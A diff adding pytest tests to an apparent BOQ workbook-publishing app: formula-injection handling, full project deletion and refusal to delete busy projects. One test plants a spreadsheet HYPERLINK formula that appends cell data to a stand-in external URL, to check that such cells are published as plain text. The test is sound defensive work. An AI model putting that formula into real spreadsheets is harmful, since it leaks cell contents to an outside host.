@@ -10,6 +10,8 @@ from decimal import Decimal
 import openpyxl
 import pytest
 from reading import read_all, start, workbook
+from sqlalchemy import select
+from sqlalchemy import text as sa_text
 
 from tawreed import decisions, ledger, packages, publish
 from tawreed.ledger import Item
@@ -173,6 +175,85 @@ def test_the_coverage_check_and_decision_log_account_for_every_item(client):
     how = [r[2] for r in rows(log["Reading"], 2)]
     assert how[0].startswith("row 4; Columns: code A, description B, unit C, quantity D, rate E, amount F")
     assert how[2] == "Set aside: internal rates"
+
+
+def test_text_that_starts_like_a_formula_is_published_as_that_text(client):
+    """A BOQ cell is data: "=HYPERLINK(...)" or "#N/A" goes out as the text the source states, never as a live
+    formula or an error, in every workbook. Only Tawreed's own formulas stay formulas."""
+    book = openpyxl.load_workbook(io.BytesIO(workbook()))
+    texts = {"A9": "=1+1", "B9": '=HYPERLINK("https://example.invalid/?"&D9,"Open")', "C9": "#N/A"}
+    for ref, text in texts.items():
+        cell = book["Div.03"][ref]
+        cell.value = text
+        cell.data_type = "s"  # a text cell in the source, as an engineer typed it
+    buffer = io.BytesIO()
+    book.save(buffer)
+    project_id = ready(client, {"Tower BOQ.xlsx": buffer.getvalue()})
+    assert approve(client, project_id).status_code == 204
+    revision = folder(client, project_id)
+
+    master = openpyxl.load_workbook(revision / "Tower BOQ - Master - Rev 00.xlsx")
+    package = openpyxl.load_workbook(revision / "Packages/01 Concrete works - Rev 00.xlsx").active
+    for sheet in (master["01 Concrete works"], package):
+        assert [sheet[ref].value for ref in ("A7", "B7", "C7")] == list(texts.values())
+        assert {sheet[ref].data_type for ref in ("A7", "B7", "C7")} == {"s"}
+        assert sheet["F7"].value == "=D7*E7" and sheet["F7"].data_type == "f"  # Tawreed's own formula stays
+    for path in revision.rglob("*.xlsx"):
+        for sheet in openpyxl.load_workbook(path).worksheets:
+            for row in sheet.iter_rows():
+                for cell in row:
+                    if cell.data_type == "f":
+                        computed(sheet, cell.coordinate)  # one of Tawreed's simple formulas, or it fails
+    log = openpyxl.load_workbook(revision / "Decision log - Rev 00.xlsx")["Placements"]
+    assert rows(log, 2)[0][:2] == ["=1+1", texts["B9"]]
+
+
+def test_deleting_a_project_removes_everything_tawreed_keeps_for_it_and_nothing_else(client):
+    kept = start(client, {"Other.xlsx": workbook()})["id"]
+    project_id = ready(client)
+    with client.app.state.sessions() as session:
+        session.add(packages.Rule(project_id=None, text="Waterproofing belongs with roofing."))
+        session.add(packages.Rule(project_id=project_id, text="Blinding belongs with concrete."))
+        session.commit()
+    assert approve(client, project_id).status_code == 204
+    home = client.app.state.home
+    assert (home / "projects" / project_id / "revisions" / "Rev 00").is_dir()
+
+    assert client.delete(f"/projects/{project_id}").status_code == 204
+    assert not (home / "projects" / project_id).exists()
+    assert client.get(f"/projects/{project_id}").json()["detail"]["code"] == "project_not_found"
+    assert [p["id"] for p in client.get("/projects").json()] == [kept]
+    with client.app.state.sessions() as session:
+        for table in ("sources", "items", "packages", "decisions", "revisions", "turns", "consents"):
+            left = session.execute(sa_text(f"SELECT COUNT(*) FROM {table} WHERE project_id = :p"), {"p": project_id})
+            assert left.scalar() == 0, table
+        for table, parent in (("source_pages", "source_id"), ("layouts", "source_id"), ("assignments", "item_id")):
+            parents = "sources" if parent == "source_id" else "items"
+            orphans = f"SELECT COUNT(*) FROM {table} WHERE {parent} NOT IN (SELECT id FROM {parents})"
+            assert session.execute(sa_text(orphans)).scalar() == 0, table
+        assert [r.text for r in session.scalars(select(packages.Rule))] == ["Waterproofing belongs with roofing."]
+    assert client.delete(f"/projects/{project_id}").status_code == 404
+
+
+def test_a_project_still_at_work_is_stopped_and_not_deleted_yet(client, monkeypatch):
+    project_id = start(client, {"Tower.xlsx": workbook()})["id"]
+    monkeypatch.setattr(client.app.state.worker, "running", lambda pid: pid == project_id)
+    response = client.delete(f"/projects/{project_id}")
+    assert response.status_code == 409 and response.json()["detail"]["code"] == "project_busy"
+    assert client.get(f"/projects/{project_id}").status_code == 200
+    with client.app.state.sessions() as session:
+        assert session.get(Project, project_id).pause_reason == {"code": "stopped"}  # until the engineer continues
+
+
+def test_a_project_whose_file_is_being_read_is_not_deleted_yet(client):
+    project = read_all(client, start(client, {"Tower.xlsx": workbook()})["id"])
+    with client.app.state.sessions() as session:
+        session.get(Source, project["sources"][0]["id"]).status = "reading"
+        session.commit()
+    response = client.delete(f"/projects/{project['id']}")
+    assert response.status_code == 409 and response.json()["detail"]["code"] == "project_busy"
+    assert client.get(f"/projects/{project['id']}").status_code == 200
+    assert (client.app.state.home / "projects" / project["id"]).is_dir()
 
 
 def test_a_failed_publish_leaves_nothing_behind(client, monkeypatch):
